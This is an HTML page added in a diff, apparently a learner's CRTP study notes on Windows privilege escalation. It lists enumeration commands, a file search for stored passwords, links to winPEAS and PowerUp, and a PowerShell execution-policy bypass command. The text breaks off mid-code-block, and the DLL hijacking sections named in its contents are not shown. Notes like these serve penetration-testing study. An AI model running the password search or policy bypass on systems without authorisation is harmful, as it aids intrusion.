@@ -1,0 +1,1697 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://akshaychavan10.github.io/CRTP/1.%20Basics/2.%20Windows%20Privilege%20Escalation/">
+      
+      
+        <link rel="prev" href="../1.%20Windows%20Introduction/">
+      
+      
+        <link rel="next" href="../3.%20Introduction%20to%20Active%20Directory/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.47">
+    
+    
+      
+        <title>2. Windows Privilege Escalation - Knowledge base</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#info-gathering" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Knowledge base" class="md-header__button md-logo" aria-label="Knowledge base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Knowledge base
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              2. Windows Privilege Escalation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Knowledge base" class="md-nav__button md-logo" aria-label="Knowledge base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Knowledge base
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome to My Knowledge Base
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CRTP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CRTP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    📝 Table of Contents
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    1. Basics
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            1. Basics
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1.%20Windows%20Introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. Windows Introduction
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    2. Windows Privilege Escalation
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    2. Windows Privilege Escalation
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#info-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      info gathering
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerable-software" class="md-nav__link">
+    <span class="md-ellipsis">
+      vulnerable software
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      DLL Hijacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-dll-hijacking-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding DLL Hijacking Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-the-malicious-dll-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating the malicious DLL file
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#unquoted-service-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      Unquoted Service Path
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-wins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick wins
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.%20Introduction%20to%20Active%20Directory/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Introduction to Active Directory
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4.%20Methodology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    4. Methodology
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5.%20Miscellaeous%20Notes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    5. Miscellaeous Notes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2. Domain Enumeration
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            2. Domain Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Domain%20Enumeration/1.%20Basics%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. Basics Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Domain%20Enumeration/2.%20GPO%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. GPO Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Domain%20Enumeration/3.%20ACL%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. ACL Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Domain%20Enumeration/4.%20Trusts%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    4. Trusts Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2.%20Domain%20Enumeration/5.%20BloodHound%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    5. BloodHound Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3. Lateral Movement
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            3. Lateral Movement
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Lateral-Movement/1.%20Invoke-Command/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. Invoke-Command
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Lateral-Movement/2.%20Invoke-Mimikatz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. Invoke Mimikatz
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    4. Domain Persistence
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            4. Domain Persistence
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Domain-Persistence/1.%20Golden%20Ticket/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. Golden Ticket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Domain-Persistence/2.%20Silver%20Ticket/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. Silver Ticket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../4.%20Domain-Persistence/3.%20Skeleton%20key/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Skeleton key
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    5. Domain Priv Esc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            5. Domain Priv Esc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Domain%20Priv%20Esc/1.%20kerberost/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. kerberost
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Domain%20Priv%20Esc/2.%20Unconstrained%20Delegation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. Unconstrained Delegation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../5.%20Domain%20Priv%20Esc/3.%20Constrained%20Delegation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Constrained Delegation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    6. Forest Trusts Abuse
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            6. Forest Trusts Abuse
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../6.%20Forest%20Trusts%20Abuse/1.%20Ticket%20Abuse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1. Ticket Abuse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../6.%20Forest%20Trusts%20Abuse/2.%20MSSQL%20Abuse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. MSSQL Abuse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Networking HTB
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Networking HTB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/1.%20%20Networking%20Structure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    1.  Networking Structure
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/2.%20Networking%20Workflow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2. Networking Workflow
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/3.%20Addressing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    3. Addressing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/4.%20Protocols%20%26%20Terminology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    4. Protocols & Terminology
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/5.%20Connection%20Establishment/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    5. Connection Establishment
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/6.%20DNS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    6. DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking-HTB/list/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    📝 Table of Contents
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#info-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      info gathering
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerable-software" class="md-nav__link">
+    <span class="md-ellipsis">
+      vulnerable software
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      DLL Hijacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-dll-hijacking-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding DLL Hijacking Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-the-malicious-dll-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating the malicious DLL file
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#unquoted-service-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      Unquoted Service Path
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-wins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick wins
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>2. Windows Privilege Escalation</h1>
+
+<p><strong>most common user level</strong></p>
+<ol>
+<li>Administrator(local) : This is the user with the most privileges.</li>
+<li>standard (local) :  These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. </li>
+<li>Guest: This account gives access to the system but is not defined as a user. </li>
+<li>Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges</li>
+<li>Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain. </li>
+</ol>
+<p><em>Note : You may see some sources refer to <code>SYSTEM</code> as a privileged account.<code>SYSTEM</code> is not an account in the proper sense. Windows and its services use the "SYSTEM" account to perform their tasks.</em></p>
+<p><strong>methodology</strong></p>
+<ul>
+<li>enumerate the target for current user's privileges and resources it can access.</li>
+<li>if antivirus allow run automated scripts such as(winpeas or powerups.ps1)</li>
+<li>if above not work go to manual stratergy.like 
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">link</a></li>
+</ul>
+<h2 id="info-gathering">info gathering</h2>
+<ul>
+<li>enumerate users and their privileges on the target system.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>cmd</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>whoami /priv</code></td>
+<td>Current user’s privileges</td>
+</tr>
+<tr>
+<td><code>net users</code></td>
+<td>list users</td>
+</tr>
+<tr>
+<td><code>net user username</code></td>
+<td>List details of a user</td>
+</tr>
+<tr>
+<td><code>qwinsta</code></td>
+<td>Other users logged in simultaneously</td>
+</tr>
+<tr>
+<td><code>net localgroup</code></td>
+<td>User groups defined on the system</td>
+</tr>
+<tr>
+<td><code>net localgroup groupname</code></td>
+<td>List members of a specific group</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>collect system information</li>
+</ul>
+<p><code>systeminfo</code> : overview of the target system.
+<code>hostname</code> : computer name.</p>
+<ul>
+<li>searching file</li>
+</ul>
+<p><code>findstr /si password *.txt</code></p>
+<p><code>/si</code> : (s) search current dir and sub-directory, (i) ignore upper/lower case difference.
+<code>password</code> : search for this string in files.
+<code>*.txt</code> : search all file that have .txt extention</p>
+<ul>
+<li>network connection</li>
+</ul>
+<p>The netstat command can be used to list all listening ports on the target system.</p>
+<p><code>netstat -ano</code> : a: Displays all active connections and listening ports on the target system. 
+n : Prevents name resolution. 
+o : Displays the process ID using each listed connection. </p>
+<p>Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service. then you can try port forwarding to exploit this service.</p>
+<ul>
+<li>Scheduled Tasks</li>
+</ul>
+<p><code>schtasks /query /fo LIST /v</code> </p>
+<ul>
+<li>Drivers </li>
+</ul>
+<p>additional software installed to allow the operating system to interact with an external device. (printer,web cameras etc)</p>
+<p><code>driverquery</code> : list driver installed on system. you need some online research to exploit this type ov vulns.</p>
+<hr />
+<h2 id="tools">tools</h2>
+<ul>
+<li>
+<p>winpeas
+<a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">link</a></p>
+</li>
+<li>
+<p>powerup
+<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">link</a></p>
+</li>
+</ul>
+<p>to run powerups need to bypass the execution policy restrictions. use following cmds.</p>
+<pre><code class="language-cmd">C:\Users\user\Desktop&gt;powershell.exe -nop -exec bypass
+
